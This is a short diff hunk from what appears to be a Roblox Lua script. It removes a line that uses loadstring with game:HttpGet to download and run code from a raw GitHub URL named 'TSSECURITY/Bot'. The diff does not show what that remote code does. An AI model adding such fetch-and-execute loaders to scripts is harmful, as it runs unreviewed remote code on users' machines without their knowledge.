@@ -11,8 +11,6 @@ Arrays  | Designing + Programming + New Features
 ]]
 
 
-local botSet;
-botSet = loadstring(game:HttpGet("https://raw.githubusercontent.com/ieufhosivdlkjv/TSSECURITY/refs/heads/main/Bot"))()
 
 local Release = "Release 2A"
 local NotificationDuration = 6.5
